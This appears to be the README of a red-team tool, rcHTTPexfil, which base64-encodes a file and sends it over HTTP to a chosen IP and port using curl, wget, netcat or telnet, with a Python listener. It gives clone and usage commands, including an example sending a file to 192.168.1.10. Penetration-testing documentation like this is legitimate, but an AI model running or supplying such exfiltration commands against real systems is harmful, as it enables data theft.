#######################################################################
Red Crow Labs 
#######################################################################

rcHTTPexfil is a shell script which takes in a text file, base64 encodes it, and attempts to transmit it to a specified IP and Port using HTTP. This tool tries various methods for transmitting including curl, wget, netcat, and telnet.

This is a basic and insecure data exfiltration tool which is useful when doing testing on a system and there is a need to copy data from it to a central host for analysis.

========================================================================= INSTALL:

git clone https://github.com/redcrowlab/rcHTTPexfil.git

========================================================================= USAGE:

chmod 755 rcHTTPexfil.sh
./rcHTTPexfil.sh [filename] [URL] [Port]

example:

./rcHTTPexfil.sh surveyData.txt http://192.168.1.10 8080

On the listener side do:

python rcHTTPexfilListener.py 192.168.1.10 8080

========================================================================= NOTE:

Requires python on the listener host and curl, wget, netcat, or telnet on the transmitting host.